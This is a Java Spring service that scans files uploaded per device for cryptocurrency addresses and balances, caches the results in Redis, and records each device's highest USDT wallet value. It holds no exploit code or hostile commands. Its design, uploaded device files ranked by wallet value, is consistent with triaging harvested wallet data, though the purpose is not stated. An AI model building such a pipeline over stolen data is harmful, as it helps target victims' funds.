package com.consumer.service;

import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.consumer.config.V26ConsumerProperties;
import com.consumer.dao.UploadFileDao;
import com.consumer.entity.UploadFileEntity;
import com.consumer.parse.PackageAddressScan;
import com.consumer.parse.PackageAddressScan.FileRef;
import com.consumer.parse.PackageAddressScan.Row;
import com.consumer.util.UploadPaths;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

/**
 * 上传解析结束后扫包内地址余额，写入 Redis，并抬高 devices.wallet_usdt_max。
 * 同一设备与管理端互斥，进程内最多同时解 3 个包。
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class PackageAddressService {

    static final String CACHE_PREFIX = "v26:pkgaddr:";
    static final String LOCK_PREFIX = "v26:pkgaddr:lock:";

    private static final Semaphore SCAN = new Semaphore(3);

    private final StringRedisTemplate redis;
    private final V26ConsumerProperties props;
    private final DeviceUsdtCacheService deviceUsdtCacheService;
    private final UploadFileDao uploadFileDao;

    public void scanQueued(String deviceId) {
        String did = deviceId == null ? "" : deviceId.trim();
        if (did.isEmpty()) {
            return;
        }
        List<UploadFileEntity> uploads = uploadFileDao.selectList(new QueryWrapper<UploadFileEntity>()
                .eq("deviceId", did)
                .orderByDesc("created_at")
                .orderByDesc("id"));
        scanAfterParse(did, uploads);
    }

    public void scanAfterParse(String deviceId, List<UploadFileEntity> uploads) {
        String did = deviceId == null ? "" : deviceId.trim();
        if (did.isEmpty()) {
            return;
        }
        List<FileRef> refs = toRefs(did, uploads);
        String fp = PackageAddressScan.fingerprint(refs);
        Cached hit = read(did);
        if (hit != null && fp.equals(hit.fp)) {
            deviceUsdtCacheService.bumpWithPackage(did, PackageAddressScan.maxUsdt(hit.rows));
            return;
        }
        boolean permit = false;
        boolean locked = false;
        try {
            permit = SCAN.tryAcquire(20, TimeUnit.SECONDS);
            if (!permit) {
                log.warn("package address scan busy device={}", did);
                return;
            }
            locked = Boolean.TRUE.equals(
                    redis.opsForValue().setIfAbsent(LOCK_PREFIX + did, "1", Duration.ofSeconds(90)));
            if (!locked) {
                Cached waited = waitCache(did, fp, 40);
                if (waited != null && fp.equals(waited.fp)) {
                    deviceUsdtCacheService.bumpWithPackage(did, PackageAddressScan.maxUsdt(waited.rows));
                }
                return;
            }
            List<Row> rows = PackageAddressScan.collect(refs);
            write(did, fp, rows);
            deviceUsdtCacheService.bumpWithPackage(did, PackageAddressScan.maxUsdt(rows));
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            log.warn("package address scan fail device={}: {}", did, e.toString());
        } finally {
            if (locked) {
                try {
                    redis.delete(LOCK_PREFIX + did);
                } catch (Exception ignored) {
                }
            }
            if (permit) {
                SCAN.release();
            }
        }
    }

    private List<FileRef> toRefs(String deviceId, List<UploadFileEntity> uploads) {
        List<FileRef> refs = new ArrayList<>();
        Path dir = UploadPaths.findDeviceDir(props.getUploadDir(), deviceId);
        if (uploads == null) {
            return refs;
        }
        for (UploadFileEntity u : uploads) {
            if (u == null) {
                continue;
            }
            long size = u.getFileSize() == null ? -1L : u.getFileSize();
            if (size == 0) {
                continue;
            }
            Path path = UploadPaths.resolveDiskPath(props.getUploadDir(), u.getDiskPath());
            if (path == null && dir != null && u.getFileName() != null && !u.getFileName().isBlank()) {
                Path guess = dir.resolve(u.getFileName()).normalize();
                if (guess.startsWith(dir) && Files.isRegularFile(guess)) {
                    path = guess;
                }
            }
            if (path == null || !Files.isRegularFile(path)) {
                continue;
            }
            if (size < 0) {
                try {
                    size = Files.size(path);
                } catch (Exception e) {
                    size = 0;
                }
            }
            refs.add(new FileRef(u.getFileName(), path, size));
        }
        return refs;
    }

    private void write(String deviceId, String fp, List<Row> rows) {
        JSONObject obj = new JSONObject();
        obj.put("fp", fp);
        JSONArray arr = new JSONArray();
        if (rows != null) {
            for (Row r : rows) {
                arr.add(r.toMap());
            }
        }
        obj.put("rows", arr);
        redis.opsForValue().set(CACHE_PREFIX + deviceId, obj.toJSONString(), Duration.ofDays(7));
    }

    private Cached read(String deviceId) {
        String raw;
        try {
            raw = redis.opsForValue().get(CACHE_PREFIX + deviceId);
        } catch (Exception e) {
            return null;
        }
        if (raw == null || raw.isBlank()) {
            return null;
        }
        try {
            JSONObject obj = JSON.parseObject(raw);
            if (obj == null) {
                return null;
            }
            List<Row> rows = new ArrayList<>();
            JSONArray arr = obj.getJSONArray("rows");
            if (arr != null) {
                for (int i = 0; i < arr.size(); i++) {
                    JSONObject one = arr.getJSONObject(i);
                    if (one != null) {
                        rows.add(Row.fromMap(one));
                    }
                }
            }
            Cached c = new Cached();
            c.fp = obj.getString("fp");
            c.rows = rows;
            return c;
        } catch (Exception e) {
            return null;
        }
    }

    private Cached waitCache(String deviceId, String fp, int tries) throws InterruptedException {
        Cached last = null;
        for (int i = 0; i < tries; i++) {
            Thread.sleep(500);
            last = read(deviceId);
            if (last != null && fp.equals(last.fp)) {
                return last;
            }
        }
        return last;
    }

    private static final class Cached {
        private String fp;
        private List<Row> rows;
    }
}
